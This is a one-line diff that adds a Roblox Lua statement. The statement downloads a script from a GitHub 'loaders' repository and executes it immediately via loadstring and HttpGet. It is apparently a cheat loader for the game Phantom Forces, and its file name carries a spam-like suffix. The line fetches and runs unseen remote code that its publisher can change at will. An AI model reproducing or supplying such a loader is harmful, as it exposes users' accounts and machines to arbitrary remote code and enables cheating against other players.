@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam6-pc20bphkkvx2br.lua"))()
